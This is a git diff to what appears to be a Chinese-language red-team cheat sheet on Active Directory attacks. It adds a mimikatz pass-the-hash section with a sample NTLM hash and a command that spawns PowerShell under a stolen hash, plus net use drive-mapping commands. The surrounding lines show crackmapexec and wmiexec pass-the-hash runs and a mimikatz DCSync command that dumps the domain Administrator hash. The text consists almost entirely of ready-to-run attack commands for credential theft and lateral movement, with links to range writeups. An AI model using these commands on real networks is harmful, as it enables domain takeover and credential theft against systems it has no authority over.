@@ -143,6 +143,12 @@ proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb4
 ```
 ### DC Takeover
 [Ichunqiu云境 —— Tsclient Writeup](https://mp.weixin.qq.com/s/1VDwjl_fhpZOKUy5-ZHCTQ)
+### mimikatz PTH传递攻击
+
+```sh
+sekurlsa::pth /user:administrator /domain:g1ts /ntlm:ad5a870327c02f83cb947af6a94a4c23
+mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
+```
 
 ### 约束委派攻击
 [1](https://mp.weixin.qq.com/s/O2LC0Qk55AAOqLGTJmzISg)
@@ -173,6 +179,15 @@ mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
 python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
 ```
 
+
+## net use 映射磁盘
+
+```bash
+net use P: /del
+net use P: \\168.1.1.0\zhq3211
+net use P: /del
+net use P: \\Name\zhq3211
+```
 # Article
 
 [域内定位个人PC的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
